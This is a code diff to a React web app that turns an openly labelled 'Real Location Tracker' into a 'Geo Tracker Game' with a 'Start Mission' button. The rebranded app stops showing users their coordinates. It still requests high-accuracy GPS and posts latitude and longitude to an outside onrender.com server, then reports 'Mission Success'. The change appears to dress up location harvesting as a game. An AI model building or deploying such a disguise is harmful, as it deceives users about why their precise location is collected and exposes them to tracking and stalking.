@@ -1,36 +1,41 @@
 import { useState } from "react";
 
 function App() {
-  const [msg, setMsg] = useState("Click to detect location");
+  const [status, setStatus] = useState("🎮 Click Start to begin mission");
+  const [started, setStarted] = useState(false);
 
-  const getLocation = () => {
+  const startTracking = () => {
+    setStarted(true);
+    setStatus("🛰️ Initializing GPS...");
+
     if (!navigator.geolocation) {
-      setMsg("❌ Not supported");
+      setStatus("❌ Device not supported");
       return;
     }
-
-    setMsg("📡 Getting location...");
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         const lat = pos.coords.latitude;
         const lng = pos.coords.longitude;
 
-        setMsg(`📍 Lat: ${lat}, Lng: ${lng}`);
+        setStatus("📡 Sending data to server...");
 
-        // ✅ LIVE BACKEND
-        await fetch("https://location-tracker-km22.onrender.com/location", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ lat, lng }),
-        });
+        try {
+          await fetch("https://location-tracker-km22.onrender.com/location", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ lat, lng }),
+          });
 
-        setMsg("✅ Location sent successfully 🚀");
+          setStatus("✅ Mission Success 🚀");
+        } catch (err) {
+          setStatus("❌ Server error");
+        }
       },
       () => {
-        setMsg("❌ Permission denied");
+        setStatus("❌ Permission denied");
       },
       {
         enableHighAccuracy: true,
@@ -39,16 +44,56 @@ function App() {
   };
 
   return (
-    <div style={{ textAlign: "center", marginTop: "100px" }}>
-      <h1>🌍 Real Location Tracker</h1>
+    <div style={styles.container}>
+      <h1 style={styles.title}>🎮 Geo Tracker Game</h1>
 
-      <button onClick={getLocation}>
-        Get My Location
-      </button>
-
-      <p>{msg}</p>
+      {!started ? (
+        <button style={styles.button} onClick={startTracking}>
+          ▶ Start Mission
+        </button>
+      ) : (
+        <div style={styles.card}>
+          <p style={styles.status}>{status}</p>
+        </div>
+      )}
     </div>
   );
 }
+
+const styles = {
+  container: {
+    height: "100vh",
+    display: "flex",
+    flexDirection: "column",
+    justifyContent: "center",
+    alignItems: "center",
+    background: "linear-gradient(135deg, #0f172a, #1e293b)",
+    color: "white",
+    fontFamily: "Arial",
+  },
+  title: {
+    fontSize: "40px",
+    marginBottom: "30px",
+  },
+  button: {
+    padding: "15px 30px",
+    fontSize: "18px",
+    borderRadius: "10px",
+    border: "none",
+    cursor: "pointer",
+    background: "#22c55e",
+    color: "white",
+    transition: "0.3s",
+  },
+  card: {
+    padding: "30px",
+    borderRadius: "15px",
+    background: "#1e293b",
+    boxShadow: "0 0 20px rgba(0,0,0,0.5)",
+  },
+  status: {
+    fontSize: "20px",
+  },
+};
 
 export default App;
